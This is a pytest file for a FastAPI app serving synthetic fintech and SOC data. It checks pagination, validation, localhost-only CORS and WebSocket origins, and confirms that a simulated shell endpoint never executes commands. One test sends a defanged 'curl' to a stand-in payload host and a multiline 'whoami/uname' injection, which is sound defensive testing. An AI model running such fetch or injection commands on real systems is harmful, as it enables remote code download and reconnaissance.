from __future__ import annotations

from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from app.main import app


def test_health_readiness_and_pagination() -> None:
    with TestClient(app) as client:
        health = client.get("/api/v1/health")
        assert health.status_code == 200
        assert health.json()["synthetic"] is True

        readiness = client.get("/api/v1/ready")
        assert readiness.status_code == 200
        assert readiness.json()["status"] == "ready"
        assert readiness.json()["integrity_verified"] is True

        response = client.get("/api/v1/fintech/customers", params={"limit": 5, "offset": 10})
        assert response.status_code == 200
        payload = response.json()
        assert len(payload["items"]) == 5
        assert payload["meta"]["total"] == 120
        assert payload["meta"]["has_more"] is True


def test_filters_validation_and_unknown_resources() -> None:
    with TestClient(app) as client:
        incoming = client.get("/api/v1/fintech/transactions", params={"direction": "incoming", "limit": 100})
        assert incoming.status_code == 200
        assert incoming.json()["meta"]["total"] == 150
        assert all(row["direction"] == "incoming" for row in incoming.json()["items"])

        assert client.get("/api/v1/fintech/transactions", params={"limit": 101}).status_code == 422
        assert client.get("/api/v1/soc/not-a-resource").status_code == 404


def test_shell_never_executes_and_rejects_multiline_input() -> None:
    with TestClient(app) as client:
        response = client.post(
            "/api/v1/soc/sessions/ses_00001/shell",
            json={"command": "curl hxxp://payload.example/test"},
        )
        assert response.status_code == 200
        payload = response.json()
        assert payload["executed"] is False
        assert payload["network_access"] is False
        assert payload["exit_code"] == 126

        rejected = client.post(
            "/api/v1/soc/sessions/ses_00001/shell",
            json={"command": "whoami\nuname -a"},
        )
        assert rejected.status_code == 422


def test_cors_allows_localhost_only() -> None:
    with TestClient(app) as client:
        local = client.options(
            "/api/v1/health",
            headers={
                "Origin": "http://localhost:5174",
                "Access-Control-Request-Method": "GET",
            },
        )
        assert local.headers.get("access-control-allow-origin") == "http://localhost:5174"

        external = client.options(
            "/api/v1/health",
            headers={
                "Origin": "https://attacker.example",
                "Access-Control-Request-Method": "GET",
            },
        )
        assert "access-control-allow-origin" not in external.headers


def test_websocket_stream_is_simulated() -> None:
    with TestClient(app) as client:
        with client.websocket_connect("/api/v1/stream/events?interval_ms=250") as websocket:
            payload = websocket.receive_json()
            assert payload["stream_sequence"] == 0
            assert payload["simulated"] is True
            assert payload["event"]["synthetic"] is True


def test_websocket_rejects_nonlocal_origin() -> None:
    with TestClient(app) as client:
        try:
            with client.websocket_connect(
                "/api/v1/stream/events?interval_ms=250",
                headers={"Origin": "https://attacker.example"},
            ):
                raise AssertionError("external WebSocket origin was accepted")
        except WebSocketDisconnect as error:
            assert error.code == 1008
